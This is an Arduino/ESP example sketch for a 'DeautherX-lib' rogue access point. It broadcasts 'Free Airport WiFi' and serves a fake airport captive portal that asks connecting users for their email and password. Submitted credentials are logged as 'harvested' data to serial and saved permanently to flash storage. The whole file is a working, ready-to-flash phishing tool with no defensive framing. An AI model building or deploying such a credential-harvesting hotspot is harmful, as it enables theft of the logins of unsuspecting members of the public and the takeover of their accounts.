/*
 * DeautherX-lib — RogueAP Example
 *
 * Spins up a "Free WiFi" hotspot. When users connect, they are faced with
 * a captive portal asking for their Email and Password.
 * Captured data is intercepted and printed to Serial, and also
 * permanently saved to the ESP flash via DStorage.
 */

#include <DeautherLib.h>

DeautherRogueAP rogueAP;

// Callback triggered whenever someone submits the captive portal form
void onData(const String& dataType, const String& jsonData, const char* clientIP) {
    Serial.println(F("\n--- 🚨 NEW DATA HARVESTED 🚨 ---"));
    Serial.print(F("Client IP : ")); Serial.println(clientIP);
    Serial.print(F("Data Type : ")); Serial.println(dataType);
    Serial.print(F("JSON Data : ")); Serial.println(jsonData);
    Serial.println(F("----------------------------------\n"));
}

void setup() {
    Serial.begin(115200);
    Serial.println(F("\n[RogueAP] Starting up..."));

    // Optional: Format storage on boot for testing (WARNING: deletes all saved data)
    // SPIFFS.format();

    // Configure the Rogue AP
    RogueAPConfig cfg;
    cfg.ssid        = "Free Airport WiFi";
    cfg.portalTitle = "Airport Internet Access";
    cfg.channel     = 6;

    // We can use the default modern HTML portal, or provide our own.
    // cfg.customHtml = "<!DOCTYPE html><html><body><h1>Custom Page!</h1></body></html>";

    // Bind callback
    rogueAP.onDataReceived(onData);

    // Start AP + DNS + HTTP
    rogueAP.start(cfg);

    // Print previously harvested data on boot
    Serial.println(F("\n[Storage] Previously stored data:"));
    DStorage::printFile("/harvested.jsonl");
}

void loop() {
    // Required: drives the DNS and HTTP servers
    rogueAP.update();
}
